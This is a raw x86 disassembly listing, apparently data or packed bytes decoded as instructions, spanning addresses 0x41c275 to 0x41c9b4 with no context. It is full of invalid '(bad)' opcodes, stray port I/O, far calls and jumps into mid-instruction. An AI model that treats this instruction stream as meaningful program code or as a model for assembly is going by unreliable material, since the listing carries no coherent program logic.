  41c275:	xchg   esp,eax
  41c276:	jnp    0x41c277
  41c278:	add    BYTE PTR [esi-0x59007e37],ch
  41c27e:	jno    0x41c204
  41c280:	call   FWORD PTR [esi+0x31000121]
  41c286:	and    al,BYTE PTR [ecx]
  41c288:	add    BYTE PTR [ecx],dh
  41c28a:	cmp    bh,BYTE PTR [ecx-0x1]
  41c28d:	xchg   BYTE PTR [ecx],al
  41c28f:	cmp    bh,0x7e
  41c292:	popf   
  41c293:	test   bh,bh
  41c295:	jbe    0x41c2b8
  41c297:	add    DWORD PTR [eax],eax
  41c299:	xor    DWORD PTR [ecx],ecx
  41c29b:	out    0x3,eax
  41c29d:	xor    DWORD PTR [ecx],ecx
  41c29f:	sar    DWORD PTR [ebx+0x5e],0x37
  41c2a3:	ret    
  41c2a4:	adc    DWORD PTR [esi+0x37],0x374e844f
  41c2ab:	out    0x3,eax
  41c2ad:	xor    DWORD PTR [ecx],ecx
  41c2af:	out    0x3,eax
  41c2b1:	xor    DWORD PTR [ecx],ecx
  41c2b3:	adc    DWORD PTR [esi+esi*1+0x37],edi
  41c2b7:	pop    edi
  41c2b8:	sub    BYTE PTR [esi],0x37
  41c2bb:	retf   
  41c2bc:	and    BYTE PTR [esi],0x37
  41c2bf:	out    0x3,eax
  41c2c1:	xor    DWORD PTR [ecx],ecx
  41c2c3:	out    0x3,eax
  41c2c5:	xor    DWORD PTR [ecx],ecx
  41c2c7:	fnstsw WORD PTR [edx+0xe]
  41c2ca:	aaa    
  41c2cb:	cmp    eax,DWORD PTR [edx+0x3e73706]
  41c2d1:	xor    DWORD PTR [ecx],ecx
  41c2d3:	out    0x3,eax
  41c2d5:	xor    DWORD PTR [ecx],ecx
  41c2d7:	out    0x3,eax
  41c2d9:	xor    DWORD PTR [ecx],ecx
  41c2db:	out    0x3,eax
  41c2dd:	add    BYTE PTR [ecx],dh
  41c2df:	or     edi,esp
  41c2e1:	add    esi,DWORD PTR [ecx]
  41c2e3:	or     DWORD PTR [edi-0x62c9297f],esp
  41c2e9:	or     esi,0xc681a136
  41c2ef:	ss iret 
  41c2f1:	cmp    DWORD PTR [esi-0x497e44ca],0xae80e736
  41c2fb:	ss cmc 
  41c2fd:	and    BYTE PTR [esi-0x617f02ca],0x36
  41c304:	rol    DWORD PTR [eax-0x7f30c96a],0x8e
  41c30b:	sub    eax,DWORD PTR ss:[ecx-0x7ee8c97a]
  41c312:	jle    0x41c34a
  41c314:	add    BYTE PTR [edi],cl
  41c316:	mov    al,0x36
  41c318:	std    
  41c319:	imul   esi,DWORD PTR [ecx-0x4e8602ca],0x36
  41c320:	std    
  41c321:	xchg   DWORD PTR [ecx-0x4e6002ca],esi
  41c327:	ss std 
  41c329:	and    DWORD PTR [ecx-0x4ede02ca],esi
  41c32f:	ss std 
  41c331:	push   ebx
  41c332:	mov    cl,0x36
  41c334:	std    
  41c335:	xor    esi,DWORD PTR [ecx-0x512002ca]
  41c33b:	ss std 
  41c33d:	add    eax,0xd9fd35b1
  41c342:	add    BYTE PTR [esi-0x695002ca],bl
  41c348:	ss std 
  41c34a:	mov    bh,0x8e
  41c34c:	ss std 
  41c34e:	mov    eax,DWORD PTR [esi+0x7e7ffd36]
  41c354:	ss std 
  41c356:	pop    ecx
  41c357:	jbe    0x41c38f
  41c359:	std    
  41c35a:	dec    edi
  41c35b:	outs   dx,BYTE PTR ds:[esi]
  41c35c:	ss std 
  41c35e:	xchg   edi,eax
  41c35f:	mov    ecx,0xa9a9fd35
  41c364:	xor    eax,0x35a9a5fd
  41c369:	std    
  41c36a:	lods   eax,DWORD PTR ds:[esi]
  41c36b:	mov    ecx,0xb9d1fd35
  41c370:	xor    eax,0x35a9bdfd
  41c375:	std    
  41c376:	in     eax,0xa9
  41c378:	xor    eax,0x35b9cffd
  41c37d:	std    
  41c37e:	xlat   BYTE PTR ds:[ebx]
  41c37f:	mov    ecx,0xa827fd35
  41c384:	xor    eax,0x35a80bfd
  41c389:	std    
  41c38a:	adc    edi,DWORD PTR [eax+0xc00fd35]
  41c390:	cmp    ch,0xff
  41c393:	inc    esp
  41c394:	cmp    ch,0xff
  41c397:	int3   
  41c398:	jg     0x41c397
  41c39a:	inc    eax
  41c39c:	jg     0x41c39b
  41c39e:	(bad)  
  41c39f:	(bad)  
  41c3a0:	jg     0x41c39f
  41c3a2:	(bad)  
  41c3a3:	(bad)  
  41c3a4:	jg     0x41c3a3
  41c3a6:	inc    DWORD PTR [eax]
  41c3a8:	inc    esi
  41c3a9:	jg     0x41c3a8
  41c3ab:	call   FWORD PTR [edi+edi*2-0x3]
  41c3af:	call   FWORD PTR [ebx+eax*4]
  41c3b2:	std    
  41c3b3:	push   DWORD PTR [edx]
  41c3b5:	cmp    ebp,0xffffffff
  41c3b8:	dec    eax
  41c3b9:	or     DWORD PTR [eax],eax
  41c3bb:	add    dh,dh
  41c3bd:	cmp    ch,0xff
  41c3c0:	into   
  41c3c1:	cmp    ch,0xff
  41c3c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c5:	jg     0x41c3c4
  41c3c7:	jmp    DWORD PTR [esi+0x7f]
  41c3ca:	std    
  41c3cb:	jmp    DWORD PTR [esi+0x7f]
  41c3ce:	std    
  41c3cf:	inc    DWORD PTR [edx+0x7f]
  41c3d2:	std    
  41c3d3:	dec    DWORD PTR [eax]
  41c3d5:	or     DWORD PTR [eax],eax
  41c3d7:	add    BYTE PTR [edi+edi*2],ah
  41c3da:	std    
  41c3db:	(bad)  
  41c3dc:	fmul   DWORD PTR [eax]
  41c3de:	add    BYTE PTR [eax],al
  41c3e0:	int3   
  41c3e1:	cmp    ch,0xff
  41c3e4:	int3   
  41c3e5:	jg     0x41c3e4
  41c3e7:	jmp    FWORD PTR [eax]
  41c3e9:	cmp    ch,0xff
  41c3ec:	into   
  41c3ed:	jg     0x41c3ec
  41c3ef:	jmp    FWORD PTR [eax+eax*4]
  41c3f2:	std    
  41c3f3:	dec    DWORD PTR [eax+eax*4]
  41c3f6:	std    
  41c3f7:	call   FWORD PTR [eax+eax*4]
  41c3fa:	std    
  41c3fb:	jmp    FWORD PTR [esi-0x80]
  41c3fe:	std    
  41c3ff:	dec    DWORD PTR [esi-0x80]
  41c402:	std    
  41c403:	jmp    DWORD PTR [edi+edi*2]
  41c406:	std    
  41c407:	push   DWORD PTR [ecx]
  41c409:	(bad)  
  41c40a:	mov    edi,edi
  41c40c:	add    BYTE PTR [esi+0x31000122],cl
  41c412:	pusha  
  41c413:	mov    bh,bh
  41c415:	jle    0x41c439
  41c417:	add    DWORD PTR [eax],eax
  41c419:	xor    DWORD PTR [edx+ecx*4-0x764f9101],ebx
  41c420:	jmp    DWORD PTR [esi+0x22]
  41c423:	add    DWORD PTR [eax],eax
  41c425:	xor    DWORD PTR [esi],edi
  41c427:	mov    edi,edi
  41c429:	push   esi
  41c42a:	add    cl,BYTE PTR [edi+edi*8-0x76c9b2]
  41c431:	inc    esi
  41c432:	or     cl,BYTE PTR [edi+edi*8-0x769fc2]
  41c439:	ss ins BYTE PTR es:[edi],dx
  41c43b:	mov    edi,edi
  41c43d:	and    al,BYTE PTR cs:[ecx]
  41c440:	add    BYTE PTR [ecx],dh
  41c442:	test   BYTE PTR [ecx-0x766fe101],cl
  41c448:	call   DWORD PTR [esi]
  41c44a:	mov    al,ds:0xd60eff88
  41c44f:	mov    bh,bh
  41c451:	push   es
  41c452:	aam    0x88
  41c454:	(bad)  
  41c455:	dec    ch
  41c457:	mov    bh,bh
  41c459:	test   ch,0x88
  41c45c:	(bad)  
  41c45d:	out    dx,al
  41c45e:	sti    
  41c45f:	mov    bh,bh
  41c461:	out    0x6b,al
  41c463:	mov    edi,?
  41c465:	fisub  WORD PTR [ebp-0x74]
  41c468:	call   esi
  41c46a:	and    DWORD PTR [ecx],eax
  41c46c:	add    BYTE PTR [ecx],dh
  41c46e:	dec    esp
  41c46f:	mov    edi,?
  41c471:	add    dh,al
  41c473:	inc    edi
  41c474:	mov    edi,?
  41c476:	mov    esi,0x31000121
  41c47b:	bound  eax,QWORD PTR [esi-0x796c5101]
  41c481:	jmp    DWORD PTR [esi-0x61793ef8]
  41c487:	xor    ecx,DWORD PTR [edi-0x64cc697a]
  41c48d:	xchg   BYTE PTR [esi-0x797b18cd],cl
  41c493:	xor    esi,ebp
  41c495:	test   BYTE PTR [esi+0x33],bh
  41c498:	fld    QWORD PTR [esi+esi*2+0x6e84c133]
  41c49f:	xor    ebp,DWORD PTR [edi-0x54cc997c]
  41c4a5:	test   BYTE PTR [esi+0x33],bl
  41c4a8:	mov    bh,0x84
  41c4aa:	push   esi
  41c4ab:	xor    ecx,ebp
  41c4ad:	test   BYTE PTR [esi+0x33],cl
  41c4b0:	imul   eax,DWORD PTR [ebp-0x7aa8ccba],0x8585333e
  41c4ba:	xor    edi,DWORD PTR ss:[ebp-0x7b]
  41c4be:	xor    ebx,DWORD PTR cs:[edi]
  41c4c1:	test   DWORD PTR [esi],esp
  41c4c3:	xor    edi,DWORD PTR [edi]
  41c4c5:	test   DWORD PTR [esi],ebx
  41c4c7:	xor    edx,DWORD PTR [ecx]
  41c4c9:	test   DWORD PTR [esi],edx
  41c4cb:	xor    edx,DWORD PTR [ecx]
  41c4cd:	test   DWORD PTR [esi],ecx
  41c4cf:	xor    ebx,ebp
  41c4d1:	xchg   DWORD PTR [esi],eax
  41c4d3:	xor    esp,ebx
  41c4d5:	xchg   DWORD PTR [eax],eax
  41c4d7:	(bad)  
  41c4d8:	xor    dh,BYTE PTR [edi-0x52cd0979]
  41c4de:	xchg   esi,ebp
  41c4e0:	xor    dl,BYTE PTR [ebp+0x4932e687]
  41c4e6:	mov    dh,bl
  41c4e8:	xor    bl,BYTE PTR [ebp-0x78]
  41c4eb:	(bad)  
  41c4ec:	xor    dh,BYTE PTR [edi-0x79]
  41c4ef:	into   
  41c4f0:	xor    ch,BYTE PTR [ebp-0x79]
  41c4f3:	(bad)  
  41c4f4:	xor    dl,BYTE PTR [ebp-0x58cd4179]
  41c4fa:	xchg   DWORD PTR [esi-0x495affce],esi
  41c500:	xor    bh,ch
  41c502:	lea    ebp,[esi-0x496e02ce]
  41c508:	xor    bh,ch
  41c50a:	popf   
  41c50b:	scas   al,BYTE PTR es:[edi]
  41c50c:	xor    bh,ch
  41c50e:	in     eax,0xb7
  41c510:	xor    bh,ch
  41c512:	out    dx,eax
  41c513:	scas   eax,DWORD PTR es:[edi]
  41c514:	xor    bh,ch
  41c516:	xlat   BYTE PTR ds:[ebx]
  41c517:	mov    bh,0x32
  41c519:	std    
  41c51a:	daa    
  41c51b:	scas   al,BYTE PTR es:[edi]
  41c51c:	xor    bh,ch
  41c51e:	or     esi,DWORD PTR [esi-0x500c02ce]
  41c524:	xor    bh,ch
  41c526:	test   DWORD PTR [edi-0x506a02ce],esi
  41c52c:	xor    bh,ch
  41c52e:	and    eax,0x31fd32b7
  41c533:	scas   eax,DWORD PTR es:[edi]
  41c534:	xor    bh,ch
  41c536:	push   edi
  41c537:	mov    bh,0x32
  41c539:	std    
  41c53a:	aas    
  41c53b:	add    BYTE PTR [edi-0x471002ce],ch
  41c541:	xor    ebp,edi
  41c543:	int    0xb8
  41c545:	xor    ebp,edi
  41c547:	aad    0xa8
  41c549:	xor    ebp,edi
  41c54b:	jecxz  0x41c4f5
  41c54d:	xor    ebp,edi
  41c54f:	jmp    0x8741ce86
  41c554:	mov    eax,0xa887fd31
  41c559:	xor    ebp,edi
  41c55b:	push   edi
  41c55c:	test   al,0x31
  41c55e:	std    
  41c55f:	dec    edi
  41c560:	mov    eax,0xb837fd31
  41c565:	xor    ebp,edi
  41c567:	mov    bl,0xb7
  41c569:	xor    ebp,edi
  41c56b:	jmp    0xcd41cea2
  41c570:	mov    bh,0x31
  41c572:	std    
  41c573:	jmp    0x41ceaa
  41c578:	hlt    
  41c579:	mov    bh,ch
  41c57b:	inc    esp
  41c57d:	mov    bh,ch
  41c57f:	(bad)  
  41c580:	cmp    BYTE PTR [edx-0x75590003],cl
  41c586:	std    
  41c587:	call   DWORD PTR [edx+ecx*4-0x75bb0003]
  41c58e:	std    
  41c58f:	inc    DWORD PTR [edx+ecx*4-0x3]
  41c593:	inc    DWORD PTR [esi+0x36fffd8a]
  41c599:	mov    bh,ch
  41c59b:	(bad)  
  41c59c:	fmul   QWORD PTR [ecx-0x3ff0003]
  41c5a2:	mov    ebp,edi
  41c5a4:	call   FWORD PTR [eax+0x5]
  41c5a7:	add    BYTE PTR [eax],al
  41c5a9:	or     cl,BYTE PTR [edx+0x548fffd]
  41c5af:	add    BYTE PTR [eax],al
  41c5b1:	push   es
  41c5b2:	mov    bh,ch
  41c5b4:	(bad)  
  41c5b5:	jmp    0x5:0x48fffd89
  41c5bc:	add    BYTE PTR [ebp+edi*2-0x3],bl
  41c5c0:	(bad)  
  41c5c1:	cmp    BYTE PTR [ebp-0x3],bh
  41c5c4:	jmp    DWORD PTR [eax*4-0x7aef0003]
  41c5cb:	std    
  41c5cc:	dec    edx
  41c5ce:	test   ch,bh
  41c5d0:	call   esi
  41c5d2:	test   ch,bh
  41c5d4:	call   FWORD PTR [eax]
  41c5d6:	or     eax,0x84ae0000
  41c5db:	std    
  41c5dc:	(bad)  
  41c5dd:	jp     0x41c563
  41c5df:	std    
  41c5e0:	call   FWORD PTR [edx+0x7d]
  41c5e3:	std    
  41c5e4:	inc    DWORD PTR [ebp+edi*2-0x7ba10003]
  41c5eb:	std    
  41c5ec:	jmp    FWORD PTR [esp+eax*4-0x79ce0003]
  41c5f3:	mov    edi,edi
  41c5f5:	(bad)  
  41c5f6:	cwde   
  41c5f7:	mov    edi,edi
  41c5f9:	mov    esi,0xb6ff8988
  41c5fe:	pop    esi
  41c5ff:	mov    edi,edi
  41c601:	scas   al,BYTE PTR es:[edi]
  41c602:	and    al,BYTE PTR [ecx]
  41c604:	add    BYTE PTR [eax],al
  41c606:	xor    DWORD PTR [eax-0x77],ecx
  41c609:	call   FWORD PTR [esi-0x69007694]
  41c60f:	and    al,BYTE PTR [ecx]
  41c611:	add    BYTE PTR [ecx],dh
  41c613:	push   ebp
  41c614:	add    DWORD PTR [ecx+0x3],eax
  41c617:	add    eax,0xe01473a3
  41c61c:	stos   BYTE PTR es:[edi],al
  41c61d:	imul   ecx,DWORD PTR [ecx+eiz*8],0x3
  41c621:	aas    
  41c622:	xor    edx,DWORD PTR [edi+eiz*4]
  41c625:	pop    esi
  41c626:	int    0xe7
  41c628:	stos   BYTE PTR es:[edi],al
  41c629:	imul   edx,esp,0x21
  41c62c:	add    DWORD PTR [ecx],esp
  41c62e:	xor    DWORD PTR [ebx-0x53],esp
  41c631:	ins    BYTE PTR es:[edi],dx
  41c632:	ret    0xc93c
  41c635:	pop    esi
  41c636:	xlat   BYTE PTR ds:[ebx]
  41c637:	inc    ebp
  41c638:	lods   eax,DWORD PTR ds:[esi]
  41c639:	bound  esi,QWORD PTR [ecx]
  41c63b:	retf   
  41c63c:	(bad)  
  41c63d:	push   esp
  41c63e:	ret    
  41c63f:	pop    eax
  41c640:	mov    ch,0x62
  41c642:	ja     0x41c68d
  41c644:	lods   eax,DWORD PTR ds:[esi]
  41c645:	bound  esi,QWORD PTR [ecx]
  41c647:	cmp    eax,0x8ea26c02
  41c64c:	scas   eax,DWORD PTR es:[edi]
  41c64d:	imul   ecx,DWORD PTR [eax+eax*4-0x2df1003c],0x3
  41c655:	inc    ebp
  41c656:	xchg   ebp,eax
  41c657:	scas   eax,DWORD PTR es:[edi]
  41c658:	sahf   
  41c659:	pop    esi
  41c65a:	lea    esi,[esi-0x52]
  41c65d:	pusha  
  41c65e:	mov    ah,BYTE PTR [edx]
  41c660:	add    DWORD PTR [ebp+0x6cad5f30],esi
  41c666:	push   ebx
  41c667:	sub    DWORD PTR [ebp+0x94f0052],0xa451ad53
  41c671:	out    0x3,al
  41c673:	lds    ecx,FWORD PTR [ecx]
  41c675:	and    ebp,DWORD PTR [ebp-0x39c555af]
  41c67b:	inc    eax
  41c67c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c67d:	dec    ebx
  41c67e:	add    al,0xc1
  41c680:	or     DWORD PTR [ebx],ebp
  41c682:	lods   eax,DWORD PTR ds:[esi]
  41c683:	adc    DWORD PTR [edx-0x62e53cbe],ebp
  41c689:	cmp    eax,0x2f9ea1
  41c68e:	add    DWORD PTR ds:0x11b212bc,eax
  41c694:	mov    ecx,0x2f86c30f
  41c699:	cli    
  41c69a:	add    BYTE PTR ds:0x11b1fabc,cl
  41c6a0:	stos   BYTE PTR es:[edi],al
  41c6a1:	bnd ret 0x2f6e
  41c6a5:	fiadd  WORD PTR [edx]
  41c6a7:	in     al,dx
  41c6a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6a9:	(bad)
  41c6ad:	retf   
  41c6ae:	ret    0xb4e2
  41c6b1:	fsubr  DWORD PTR [edx-0x59254a30]
  41c6b7:	ror    ecx,0xe6
  41c6ba:	add    ebx,DWORD PTR [edx-0x394453f8]
  41c6c0:	test   eax,0x9f73a7cc
  41c6c5:	mov    esp,0xbc9ea0aa
  41c6ca:	scas   al,BYTE PTR es:[edi]
  41c6cb:	xchg   ebx,eax
  41c6cc:	lahf   
  41c6cd:	call   0xad8f:0xbba200d0
  41c6d4:	xchg   ebp,eax
  41c6d5:	mov    edx,0x82503a7
  41c6da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c6dc:	add    bh,0x8f
  41c6df:	scas   eax,DWORD PTR es:[edi]
  41c6e0:	xchg   ebx,eax
  41c6e1:	fimul  DWORD PTR [edi+0x953b9]
  41c6e7:	mov    bh,0x32
  41c6e9:	enter  0x8471,0x93
  41c6ed:	mov    edx,0xa28a2f62
  41c6f2:	bound  ebp,QWORD PTR [edx+edx*4]
  41c6f5:	sahf   
  41c6f6:	outs   dx,DWORD PTR ds:[esi]
  41c6f7:	inc    eax
  41c6f8:	xchg   edi,eax
  41c6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6fa:	ds jmp 0x3443d032
  41c700:	xchg   edx,eax
  41c701:	sahf   
  41c702:	push   ebp
  41c703:	push   eax
  41c704:	(bad)  
  41c705:	mov    ch,0x4c
  41c707:	dec    edi
  41c708:	outs   dx,DWORD PTR ds:[esi]
  41c709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c70a:	imul   eax,DWORD PTR [ebp+esi*1+0x58],0x2
  41c70f:	cmp    al,0xc7
  41c711:	mov    ds:0xa767195e,eax
  41c716:	bound  ebx,QWORD PTR [esi]
  41c718:	je     0x41c6be
  41c71a:	inc    ebp
  41c71b:	add    cl,al
  41c71d:	stos   DWORD PTR es:[edi],eax
  41c71e:	call   DWORD PTR [edx+0x86cbd33]
  41c724:	cdq    
  41c725:	ret    0xb66
  41c728:	mov    ds:0x73f071cf,eax
  41c72d:	cs std 
  41c72f:	mov    edx,0xd562c433
  41c734:	add    BYTE PTR [edx-0x48],ah
  41c737:	ins    BYTE PTR es:[edi],dx
  41c738:	retf   0xaa73
  41c73b:	arpl   bx,bx
  41c73d:	xchg   edi,eax
  41c73e:	mov    ecx,0x8532e970
  41c743:	jmp    DWORD PTR [ebp-0x33ac4629]
  41c749:	xlat   BYTE PTR ds:[ebx]
  41c74a:	popf   
  41c74b:	dec    edi
  41c74c:	enter  0xa5e6,0x3e
  41c750:	jmp    0xaa41c187
  41c755:	shr    BYTE PTR [edx-0x363062a2],0x66
  41c75c:	fwait
  41c75d:	xlat   BYTE PTR ds:[ebx]
  41c75e:	test   al,0x73
  41c760:	add    BYTE PTR [edi-0x27be8989],bl
  41c766:	or     DWORD PTR [ebp+0x0],esp
  41c769:	xchg   esp,eax
  41c76a:	imul   sp,WORD PTR [ebp+0x64],0x4367
  41c770:	imul   edi,DWORD PTR [eax+ebp*2+0x3e],0x4304d800
  41c778:	gs fs inc esi
  41c77b:	jb     0x41c7ef
  41c77d:	pop    edx
  41c77e:	push   0x7718746b
  41c783:	ins    BYTE PTR es:[edi],dx
  41c784:	arpl   bp,si
  41c786:	jne    0x41c7f8
  41c788:	add    al,ch
  41c78a:	push   es
  41c78b:	push   ebx
  41c78c:	imul   esi,esp,0x29684067
  41c792:	ja     0x41c7e5
  41c794:	outs   dx,DWORD PTR ds:[esi]
  41c795:	pop    ebp
  41c796:	js     0x41c801
  41c798:	je     0x41c79a
  41c79a:	xor    DWORD PTR [edi+0x76],eax
  41c79d:	je     0x41c7d4
  41c79f:	add    eax,0x68470128
  41c7a4:	jno    0x41c7f2
  41c7a6:	cmp    DWORD PTR [esi+0x71],esi
  41c7a9:	inc    ebp
  41c7aa:	push   0x73
  41c7ac:	ins    BYTE PTR es:[edi],dx
  41c7ad:	jb     0x41c7f7
  41c7af:	or     DWORD PTR [ecx],edx
  41c7b1:	add    edi,DWORD PTR [esi+esi*2+0x71]
  41c7b5:	jb     0x41c832
  41c7b7:	pusha  
  41c7b8:	ins    DWORD PTR es:[edi],dx
  41c7b9:	inc    ecx
  41c7ba:	pop    eax
  41c7bb:	or     DWORD PTR [ebp+0x0],edx
  41c7be:	mov    esi,DWORD PTR [ebx+0x62]
  41c7c1:	popa   
  41c7c2:	je     0x41c82c
  41c7c4:	push   ecx
  41c7c5:	outs   dx,DWORD PTR ds:[esi]
  41c7c6:	jmp    DWORD PTR [ebp+eiz*2+0x65]
  41c7ca:	in     al,dx
  41c7cb:	js     0x41c7fd
  41c7cd:	xor    bh,BYTE PTR [ebx-0x448fa19e]
  41c7d3:	pusha  
  41c7d4:	ins    BYTE PTR es:[edi],dx
  41c7d5:	je     0x41c7ef
  41c7d7:	or     DWORD PTR [ecx],esp
  41c7d9:	add    dh,BYTE PTR [ecx]
  41c7db:	jb     0x41c790
  41c7dd:	ins    BYTE PTR es:[edi],dx
  41c7de:	xchg   edx,eax
  41c7df:	test   DWORD PTR [esi-0x408fbd90],esi
  41c7e5:	data16 arpl WORD PTR [edi+0x5ae6ffac],bp
  41c7ec:	add    ecx,DWORD PTR [ebp+0x61]
  41c7ef:	test   DWORD PTR [edi-0x5b2c9cb1],esp
  41c7f5:	bound  eax,QWORD PTR [edx-0x31]
  41c7f8:	add    esp,DWORD PTR ds:0x6cb5f233
  41c7fe:	add    BYTE PTR [edx-0x3b],dl
  41c801:	mov    ah,0x70
  41c803:	add    dh,BYTE PTR [eax]
  41c805:	(bad)  
  41c806:	bound  ebp,QWORD PTR [ecx]
  41c808:	test   BYTE PTR [ebx],0xaf
  41c80b:	xor    esp,ebx
  41c80d:	stos   BYTE PTR es:[edi],al
  41c80e:	ins    DWORD PTR es:[edi],dx
  41c80f:	adc    eax,0x2271aae4
  41c814:	push   cs
  41c815:	ret    0x1d66
  41c818:	add    eax,0x2b86ffc3
  41c81d:	push   es
  41c81e:	ins    BYTE PTR es:[edi],dx
  41c81f:	add    dl,BYTE PTR [esi]
  41c821:	mov    dh,0x60
  41c823:	add    al,0x32
  41c825:	lods   al,BYTE PTR ds:[esi]
  41c826:	ds xor eax,ecx
  41c829:	add    BYTE PTR [esi-0x28],al
  41c82c:	add    esp,DWORD PTR [eax-0x52c62bb3]
  41c832:	inc    ebp
  41c833:	enter  0xa055,0x3e
  41c837:	xor    DWORD PTR [ebp+0x1],edi
  41c83a:	inc    esi
  41c83b:	fadd   DWORD PTR [ebx-0x63]
  41c83e:	inc    eax
  41c83f:	int    0x6a
  41c841:	mov    dh,0x62
  41c843:	xor    DWORD PTR [esi],ebp
  41c845:	add    al,0x45
  41c847:	xchg   esp,eax
  41c848:	jbe    0x41c812
  41c84a:	ins    BYTE PTR es:[edi],dx
  41c84b:	lea    ebp,[ebp-0x5b]
  41c84e:	bound  ebp,QWORD PTR [ecx+0x41]
  41c851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c852:	arpl   WORD PTR [ebp+0xec48c09],ax
  41c858:	sub    al,0x75
  41c85a:	add    al,0x6c
  41c85c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c85d:	call   0xac:0x99b793d1
  41c864:	test   DWORD PTR [ebx+0x92fbbab],ebx
  41c86a:	rol    DWORD PTR [esp+ebp*2],1
  41c86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c86e:	jp     0x41c837
  41c870:	dec    ebp
  41c871:	test   al,0x87
  41c873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c874:	push   ebx
  41c875:	ret    0xa254
  41c878:	pop    ebp
  41c879:	retf   0x3e6
  41c87c:	cmp    eax,0x429f2e0a
  41c881:	fmul   DWORD PTR [edi-0x4b]
  41c884:	inc    edx
  41c885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c886:	push   ebx
  41c887:	retf   
  41c888:	sbb    al,0xa3
  41c88a:	dec    ebp
  41c88b:	add    al,0xd1
  41c88d:	or     DWORD PTR [esi],ebp
  41c88f:	lahf   
  41c890:	and    dl,ah
  41c892:	aas    
  41c893:	stos   BYTE PTR es:[edi],al
  41c894:	adc    bl,BYTE PTR [ebp+ebx*1+0x18a1f2b5]
  41c89b:	lahf   
  41c89c:	adc    DWORD PTR [ebp-0x35f849fb],esi
  41c8a2:	out    0x3,al
  41c8a4:	in     al,0x9
  41c8a6:	cs lahf 
  41c8a8:	loop   0x41c882
  41c8aa:	clc    
  41c8ab:	stos   BYTE PTR es:[edi],al
  41c8ac:	fsubr  QWORD PTR [ecx-0x49116106]
  41c8b2:	std    
  41c8b3:	mov    eax,ds:0xd4cb9ccf
  41c8b8:	ret    0xcfb6
  41c8bb:	test   eax,0x3e6c9cd
  41c8c0:	mov    ebx,0xc29eba06
  41c8c5:	(bad)  
  41c8c6:	mov    ebx,0xa4a000b5
  41c8cb:	int3   
  41c8cc:	scas   eax,DWORD PTR es:[edi]
  41c8cd:	jb     0x41c86f
  41c8cf:	(bad)  
  41c8d0:	mov    edx,0xbe73a9bf
  41c8d5:	fdiv   QWORD PTR [ebx-0x42cd16c2]
  41c8db:	(bad)  
  41c8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c8dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c8de:	mov    dh,0x4f
  41c8e0:	fwait
  41c8e1:	retf   
  41c8e2:	mov    ah,0x5e
  41c8e4:	xchg   ebp,eax
  41c8e5:	xchg   edi,eax
  41c8e6:	mov    edx,0xa3909671
  41c8eb:	imul   eax,DWORD PTR [ebp+edi*8-0x74829f59],0xffffff9d
  41c8f3:	ins    DWORD PTR es:[edi],dx
  41c8f4:	lahf   
  41c8f5:	xchg   ebx,eax
  41c8f6:	lahf   
  41c8f7:	bound  ebx,QWORD PTR [edx-0xe]
  41c8fa:	sub    bh,ch
  41c8fc:	xor    BYTE PTR [edx],dh
  41c8fe:	les    esp,FWORD PTR [edx+0x5d]
  41c901:	in     eax,0xb8
  41c903:	push   di
  41c905:	xchg   edx,eax
  41c906:	mov    dh,0x62
  41c908:	sbb    edi,esp
  41c90a:	popf   
  41c90b:	gs push eax
  41c90d:	fldenv [edi-0x141eb8ba]
  41c913:	jmp    FWORD PTR [esi+0x1d62c432]
  41c919:	je     0x41c8d2
  41c91b:	jno    0x41c938
  41c91d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c91e:	pushf  
  41c91f:	jae    0x41c94e
  41c921:	retf   0x62b8
  41c924:	or     al,cl
  41c926:	popf   
  41c927:	jno    0x41c929
  41c929:	jb     0x41c955
  41c92b:	std    
  41c92c:	fild   WORD PTR [eax]
  41c92e:	sub    eax,0xa4fd709d
  41c933:	sahf   
  41c934:	(bad)  
  41c935:	inc    DWORD PTR [ecx+0x34f4fd2a]
  41c93b:	mov    esi,0xa396cd72
  41c940:	inc    ecx
  41c941:	ror    BYTE PTR [esi+0x61be53a7],1
  41c947:	mov    ds:0x44fd0063,eax
  41c94c:	gs popa 
  41c94e:	jmp    0x718a:0xcf018905
  41c955:	push   esp
  41c956:	icebp  
  41c957:	fs push 0x6b5aa743
  41c95d:	je     0x41c977
  41c95f:	push   es
  41c960:	mov    bh,0x2
  41c962:	mov    ebx,0x98656261
  41c967:	add    eax,0x8a9f0132
  41c96c:	jno    0x41c9bb
  41c96e:	mov    bh,0x89
  41c970:	jb     0x41c9de
  41c972:	lods   eax,DWORD PTR ds:[esi]
  41c973:	inc    edi
  41c974:	data16 ins BYTE PTR es:[edi],dx
  41c976:	lods   eax,DWORD PTR ds:[esi]
  41c977:	aas    
  41c978:	pop    esi
  41c979:	ins    DWORD PTR es:[edi],dx
  41c97a:	jge    0x41c9c0
  41c97c:	std    
  41c97d:	(bad)  
  41c97e:	out    dx,eax
  41c97f:	add    ecx,DWORD PTR [ebx+eax*2+0x15]
  41c983:	fs ins DWORD PTR es:[edi],dx
  41c985:	push   ebx
  41c986:	pop    esp
  41c987:	ja     0x41c9ef
  41c989:	outs   dx,BYTE PTR ds:[esi]
  41c98a:	inc    DWORD PTR [ebx-0x3]
  41c98d:	call   DWORD PTR [ebx]
  41c98f:	add    eax,0xf1007841
  41c994:	js     0x41c9e3
  41c996:	jb     0x41c9ef
  41c998:	bound  si,DWORD PTR [ebx+0x2b]
  41c99c:	add    eax,0x684b02ad
  41c9a1:	jno    0x41c9f8
  41c9a3:	ss pop ebp
  41c9a5:	pop    esi
  41c9a6:	outs   dx,BYTE PTR ds:[esi]
  41c9a7:	sub    al,0x61
  41c9a9:	bound  esp,QWORD PTR [ebp+ebx*1+0x6d]
  41c9ad:	pusha  
  41c9ae:	gs push 0x366f6659
  41c9b4:	imul   esp,DWORD PTR [esi+0x6c],0x5c
